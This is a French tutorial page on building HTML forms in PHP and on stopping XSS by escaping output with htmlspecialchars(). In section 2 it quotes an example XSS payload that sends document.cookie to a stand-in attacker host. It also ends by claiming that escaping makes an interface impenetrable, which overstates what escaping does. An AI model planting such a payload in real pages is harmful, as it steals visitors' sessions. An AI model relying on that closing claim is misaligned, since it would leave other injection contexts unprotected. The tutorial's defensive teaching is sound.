# Page 9 : Construction de Formulaires et Protection Anti-XSS

Les formulaires sont la porte d'entrée des données, mais aussi des attaques. Voici comment les construire de manière "blindée".

## 1. La Structure HTML du Formulaire

Un bon formulaire doit être sémantique. Voici un exemple type tiré de notre projet :

```html
<form action="login.php" method="POST">
    <div class="input-group">
        <label for="email">Votre Email</label>
        <input type="text" id="email" name="email" required>
    </div>
    
    <button type="submit" name="login">Se connecter</button>
</form>
```

### Détails importants :
-   **`method="POST"`** : Cache les données de l'URL (contrairement à GET). Obligatoire pour les mots de passe.
-   **`name="email"`** : C'est la clé que vous utiliserez en PHP (`$_POST['email']`).
-   **`required`** : Une première barrière de sécurité côté navigateur.

## 2. La Faille XSS : Le danger invisible

Le XSS consiste pour un pirate à injecter du JavaScript dans un champ. 
Exemple de pseudo : `<script>fetch('http://pirate.com?cookie=' + document.cookie)</script>`.
Si vous affichez ce pseudo tel quel, le pirate vole la session de tous ceux qui voient son nom !

## 3. La Solution Ultime : `htmlspecialchars()`

Cette fonction transforme les caractères dangereux en entités HTML inoffensives :
-   `<` devient `&lt;`
-   `>` devient `&gt;`

**Règle d'or :** Échappez TOUJOURS vos variables à l'affichage.

```php
// MAUVAIS (Danger XSS)
echo "Bienvenue " . $user['username'];

// BON (Sécurisé)
echo "Bienvenue " . htmlspecialchars($user['username']);
```

## 4. Conserver les valeurs saisies (UX)

Si l'utilisateur fait une erreur, il est très frustrant de devoir tout retaper. Nous utilisons une technique pour "réinjecter" la valeur précédente dans l'input :

```html
<input type="text" name="username" value="<?= htmlspecialchars($_POST['username'] ?? '') ?>">
```

### Explication :
-   `$_POST['username'] ?? ''` : On affiche le pseudo posté s'il existe, sinon rien.
-   `htmlspecialchars()` : On sécurise l'affichage au cas où le pseudo contenait du code malveillant.

## 5. Conclusion
Un bon développeur ne fait jamais confiance à ce qui vient de l'utilisateur. En suivant ces règles d'affichage, votre interface sera impénétrable par les attaques de type injection de script.
